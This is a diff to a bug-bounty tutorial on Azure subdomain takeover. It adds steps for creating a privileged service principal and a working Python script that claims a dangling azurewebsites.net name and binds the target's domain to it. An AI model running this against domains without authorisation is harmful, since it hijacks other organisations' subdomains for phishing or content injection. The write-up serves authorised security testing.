@@ -63,7 +63,7 @@ Once the name is verified as available, proceed to configure the application for
 - For pricing, select **Basic B1**. Avoid the Free plan, it doesn’t allow custom domains.
 
 > **Remark**: Ignore the screenshot below showing the Free plan. Use **Basic B1** for full functionality.
-> {: .prompt-info }
+{: .prompt-info }
 
 ![6_Pricingplan.png](https://raw.githubusercontent.com/Excis3/excis3.github.io/refs/heads/main/media/6_Pricingplan.png)
 
@@ -140,11 +140,145 @@ Once you’ve validated the PoC and documented the takeover, don’t forget to c
 
 ## Takeovers with Python
 
-- checking
-- taking over
-- hosting a PoC
-- cleaning up
-- checking active services
+### Creating a Service Principal for CLI Access
+
+To interact with Azure via the CLI or scripts, you’ll need to create a **Service Principal account**. This account will allow you to create, modify, and delete Azure resources programmatically.
+
+Start by navigating to the **main dashboard**, then search for and open **App registrations**.
+
+![16_appregistrations.JPG](https://raw.githubusercontent.com/Excis3/excis3.github.io/refs/heads/main/media/16_appregistrations.JPG)
+
+Click **+ New registration**, give your app a recognizable name, and leave the default settings as-is. Then click **Register**.
+
+![17_register.JPG](https://raw.githubusercontent.com/Excis3/excis3.github.io/refs/heads/main/media/17_register.JPG)
+
+Once created, note down the following values:
+
+- **Application (client) ID** – used as your username
+- **Directory (tenant) ID** – your Azure tenant
+
+Next, go to **Certificates & secrets** under the **Manage** section. Click **+ New client secret**, give it a name and expiration date, and create it.
+
+![18_addsecret.JPG](https://raw.githubusercontent.com/Excis3/excis3.github.io/refs/heads/main/media/18_addsecret.JPG)
+
+> **Important**: Copy the secret value immediately after creation. It will only be displayed once. This will act as your password.
+{: .prompt-info }
+---
+
+### Assigning Permissions
+
+Now let’s grant this service principal the necessary permissions.
+
+1. Go to **Subscriptions** from the dashboard.
+2. Click into your active subscription.
+3. Select **Access control (IAM)** from the side menu.
+4. At the top, click **+ Add → Add role assignment**.
+
+Choose a role based on your needs:
+
+- **Contributor** – for most automation scenarios  
+- **Privileged Administrator Roles** – if full access is required
+
+![19_roles.JPG](https://raw.githubusercontent.com/Excis3/excis3.github.io/refs/heads/main/media/19_roles.JPG)
+
+Assign access to **User, group, or service principal**, search for the account you created, then finish with **Review + assign**.
+
+![20_user.JPG](https://raw.githubusercontent.com/Excis3/excis3.github.io/refs/heads/main/media/20_user.JPG)
+
+Your service principal is ready to use with the Azure CLI or Python scripts.
+
+### The Python script for the takeover
+This is a basic script, so you will get the idea. You can optimize it as you like.
+
+```bash
+import random
+import time
+from azure.cli.core import get_default_cli
+
+
+AZURE_USERNAME = ""
+AZURE_PASSWORD = ""
+AZURE_TENANT = ""
+
+client_domain = ""
+azure_domain = ""
+azure_location = "westus2"
+github_repo = ""
+
+azure_cli = get_default_cli()
+app_name = azure_domain.split(".azurewebsites.net")[0]
+r_app_name = f"{app_name}{random.randint(1111, 9999)}"
+resource_group = f"res_{r_app_name}"
+service_plan = f"plan_{r_app_name}"
+
+def run_cli(cli, args):
+    response = cli.invoke(args)
+    if response != 0:
+        raise Exception(f"Command failed: {' '.join(args)}")
+    return response
+
+def cleanup_resources(cli, resource_group):
+    print(f"Cleaning up resources in group: {resource_group}")
+    cli.invoke(["group", "delete", "--name", resource_group, "--no-wait", "--yes"])
+
+
+try:
+    # Login
+    run_cli(azure_cli, ['login', '--service-principal',
+                        '--username', AZURE_USERNAME,
+                        '--password', AZURE_PASSWORD,
+                        '--tenant', AZURE_TENANT,
+                        "--output", "none"])
+
+    # Create Resource Group
+    run_cli(azure_cli, ["group", "create",
+                        "--name", resource_group,
+                        "--location", azure_location,
+                        "--output", "none"])
+
+    # Create App Service Plan
+    run_cli(azure_cli, ["appservice", "plan", "create",
+                        "--name", service_plan,
+                        "--resource-group", resource_group,
+                        "--sku", "B1",
+                        "--is-linux",
+                        "--output", "none"])
+
+    # Create Web App
+    run_cli(azure_cli, ["webapp", "create",
+                        "--name", app_name,
+                        "--resource-group", resource_group,
+                        "--plan", service_plan,
+                        "--runtime", "PYTHON:3.13",
+                        "--output", "none"])
+
+    time.sleep(2)
+
+    # Deploy from GitHub
+    run_cli(azure_cli, ["webapp", "deployment", "source", "config",
+                        "--name", app_name,
+                        "--resource-group", resource_group,
+                        "--repo-url", github_repo,
+                        "--branch", "master",
+                        "--manual-integration",
+                        "--output", "none"])
+
+    time.sleep(2)
+
+    # Configure hostname
+    run_cli(azure_cli, ["webapp", "config", "hostname", "add",
+                        "--webapp-name", app_name,
+                        "--resource-group", resource_group,
+                        "--hostname", client_domain,
+                        "--output", "none"])
+
+    print(f"Domain {client_domain} is taken over successfully.")
+
+except Exception as e:
+    print(f"Deployment failed: {e}")
+    if 'resource_group' in locals():
+        cleanup_resources(azure_cli, resource_group)
+```
 
 ## Reporting Subdomain Takeovers in Bug Bounty
 
